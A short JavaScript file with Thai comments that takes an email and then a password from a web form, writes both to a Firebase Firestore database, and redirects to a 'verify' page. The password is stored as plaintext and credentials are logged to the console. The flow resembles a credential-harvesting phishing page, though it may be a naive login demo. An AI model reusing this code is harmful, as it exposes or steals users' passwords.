// ✅ Firebase Config
const firebaseConfig = {
    apiKey: "AIzaSyCTgAP4Tvlri2-seayJIrC9dpwTA-avZA0",
    authDomain: "loginsystem-7f056.firebaseapp.com",
    projectId: "loginsystem-7f056",
    storageBucket: "loginsystem-7f056.appspot.com",
    messagingSenderId: "1094872135642",
    appId: "1:1094872135642:web:72419f77faf8537c36b2e3",
    measurementId: "G-NT11WXB1W3"
};

// ✅ ตรวจสอบว่า Firebase ถูกโหลดก่อนใช้งาน
if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
}

const db = firebase.firestore();  // Firestore Database

console.log("🔥 Firebase โหลดสำเร็จ:", firebase);
console.log("📂 Firestore Instance:", db);

// 📌 ฟังก์ชันบันทึกอีเมลลง Firestore
function saveEmail() {
    let email = document.getElementById("email").value.trim();
    console.log("📩 อีเมลที่กรอก:", email);

    if (!email) {
        alert("กรุณากรอกอีเมล!");
        return;
    }

    db.collection("users").doc(email).set({
        email: email,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()  // ✅ ใช้ `firebase.firestore.FieldValue`
    }, { merge: true })
    .then(() => {
        console.log("✅ อีเมลถูกบันทึกลง Firebase:", email);
        localStorage.setItem("userEmail", email);
        alert("อีเมลถูกบันทึกแล้ว!");
        window.location.href = "password.html";
    })
    .catch(error => {
        console.error("❌ เกิดข้อผิดพลาด:", error);
        alert("เกิดข้อผิดพลาดในการบันทึก!");
    });
}

// 📌 ฟังก์ชันบันทึกรหัสผ่านลง Firestore
function savePassword() {
    let password = document.getElementById("password").value.trim();
    let email = localStorage.getItem("userEmail");

    console.log("🔑 บันทึกรหัสผ่านสำหรับ:", email);

    if (!email) {
        alert("ไม่พบอีเมล กรุณาเข้าสู่ระบบใหม่!");
        window.location.href = "index.html";
        return;
    }

    if (!password) {
        alert("กรุณากรอกรหัสผ่าน!");
        return;
    }

    db.collection("users").doc(email).update({
        password: password
    })
    .then(() => {
        console.log("✅ รหัสผ่านถูกบันทึกใน Firebase!");
        alert("รหัสผ่านถูกบันทึกแล้ว!");
        window.location.href = "verify.html"; // ไปที่หน้าตรวจสอบ
    })
    .catch(error => {
        console.error("❌ เกิดข้อผิดพลาด:", error);
        alert("เกิดข้อผิดพลาดในการบันทึก!");
    });
}
